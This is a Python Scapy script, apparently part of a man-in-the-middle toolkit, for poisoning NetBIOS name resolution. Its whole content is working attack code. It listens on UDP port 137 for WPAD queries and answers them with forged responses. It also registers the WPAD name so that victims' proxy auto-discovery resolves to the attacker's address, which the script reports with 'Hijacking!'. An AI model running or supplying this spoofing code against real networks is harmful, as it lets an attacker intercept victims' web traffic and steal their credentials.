#!/usr/bin/python
#################
#This file contains the tools necessary to tamper with NBNS/Netbios Name resolution
#################
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
import threading
sys.path.append('/usr/share/subterfuge')

def nbRegister():
   print "Registering to the Workgroup"
   
      #Build Registration Information
      #Ethernet Layer
   dstmac = "ff:ff:ff:ff:ff:ff"
   srcmac = "f0:7b:cb:4d:d6:6f"
   type = 0x0800
      #IP Layer
   srcip     = "10.31.33.74"
   dstip     = "10.31.33.91"
   
      #Transmission Layer (UDP)
   sport     = 41984
   dport     = 137
   
      #Build NBNS Packet
   packet   = Ether(dst=dstmac, src=srcmac)
   packet  /= IP(dst=dstip, src=srcip)
   packet  /= UDP(sport=sport, dport=dport)
   packet  /= NBNSQueryRequest(NAME_TRN_ID= 11386,\
                                  FLAGS=0x8500,\
                                  QDCOUNT=1,\
                                  ANCOUNT=0,\
                                  NSCOUNT=0,\
                                  ARCOUNT=0,\
                                  QUESTION_NAME= 'WPAD           ',\
                                  SUFFIX    = "workstation",\
                                  NULL=0,\
                                  QUESTION_TYPE= "NB",\
                                  QUESTION_CLASS= "INTERNET",\
                                  TTL= 259200,\
                                  RDLENGTH=6,\
                                  NB_FLAGS= 0,\
                                  NB_ADDRESS= "10.31.33.92")
   sendp(packet,verbose=0)
   
   
def nbQueryCheck(pkt, srcip, srcmac):
      #Check For Name Query
   try: 
      name = pkt.getlayer("NBNS query request").QUESTION_NAME
         #Check for WPAD
      if name.strip('\n').strip(' ') == "WPAD":
         print "WPAD Request Detected!"
         nbResponse(pkt, srcip, srcmac)
         #hijack = threading.Thread(target=nbResponse, args=(pkt, srcip, srcmac))
         #hijack.start()
   except:
      pass
      
   

   
def nbSniff():
   print "Listening for Netbios Name Queries..."
   sniff(prn=nbQueryCheck, filter="udp and port 137", store=0)

   
   
def nbResponse(pkt, srcip, srcmac):
   print srcip, srcmac
      #Build Registration Information
      #Ethernet Layer
   dstmac = pkt.src #"08:00:27:7b:81:16" #pkt.src
   srcmac = "f0:7b:cb:4d:d6:6f"
      #IP Layer
   #srcip     = "10.31.33.74"
   dstip     =  pkt.getlayer(IP).src #"10.31.33.93" #pkt.getlayer(IP)
   
   print dstip, dstmac
   
      #Build NBNS Packet
   packet   = Ether(dst=dstmac, src=srcmac)
   packet  /= IP(dst=dstip, src=srcip)
   packet  /= UDP(sport=137, dport=137)
   packet  /= NBNSQueryResponse(NAME_TRN_ID= pkt.getlayer(NBNSQueryRequest).NAME_TRN_ID,\
                                  FLAGS=0x8500,\
                                  QDCOUNT=0,\
                                  ANCOUNT=1,\
                                  NSCOUNT=0,\
                                  ARCOUNT=0,\
                                  RR_NAME= 'WPAD           ',\
                                  SUFFIX    = "workstation",\
                                  NULL=0,\
                                  QUESTION_TYPE= "NB",\
                                  QUESTION_CLASS= "INTERNET",\
                                  TTL= 259200,\
                                  RDLENGTH=6,\
                                  NB_FLAGS= 0,\
                                  NB_ADDRESS= srcip)
   sendp(packet, verbose=0)
   print "Hijacking!"